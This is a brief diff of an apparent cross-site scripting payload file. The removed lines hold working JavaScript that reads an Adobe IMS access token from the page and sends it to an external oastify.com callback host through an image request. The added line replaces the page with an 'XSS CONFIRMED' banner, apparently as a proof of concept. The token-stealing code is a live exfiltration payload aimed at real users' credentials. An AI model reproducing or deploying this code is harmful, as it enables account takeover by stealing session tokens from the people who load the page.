@@ -1,6 +1,1 @@
-(function(){
-  var t = window.adobeIMS && window.adobeIMS.getAccessToken();
-  if (t && t.token) {
-    new Image().src = 'https://b6ikdew8zh5obyabgv7cvxy8nztqreh26.oastify.com/?t=' + encodeURIComponent(t.token);
-  }
-})();
+document.title='XSS_FIRED';document.body.innerHTML='<h1 style="color:red;font-size:50px;background:black;color:white;padding:40px">XSS CONFIRMED on '+document.domain+'</h1>';
